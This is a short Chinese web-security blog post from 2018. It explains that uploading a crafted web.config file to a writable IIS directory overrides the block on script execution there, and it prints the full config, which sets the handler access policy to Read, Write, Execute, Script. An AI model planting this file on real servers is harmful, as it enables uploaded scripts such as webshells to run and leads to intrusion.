---
title: "Web.config 突破权限限制"
date: 2018-07-19T00:00:00+08:00
draft: false
author: "X1r0z"

tags: ['asp.net']
categories: ['Web安全']

hiddenFromHomePage: false
hiddenFromSearch: false
twemoji: false
lightgallery: true
ruby: true
fraction: true
fontawesome: true
linkToMarkdown: true
rssFullText: false

toc:
  enable: true
  auto: true
code:
  copy: true
  maxShownLines: 50
math:
  enable: false
share:
  enable: true
comment:
  enable: true
---


在一个可读写的目录里无法执行脚本, 通过上传特殊的 `web.config` 文件突破限制.

<!--more-->

```
<?xml version="1.0" encoding="utf-8"?>
<configuration>
    <system.webServer>
        <handlers accessPolicy="Read, Write, Execute, Script" />
    </system.webServer>
</configuration>
```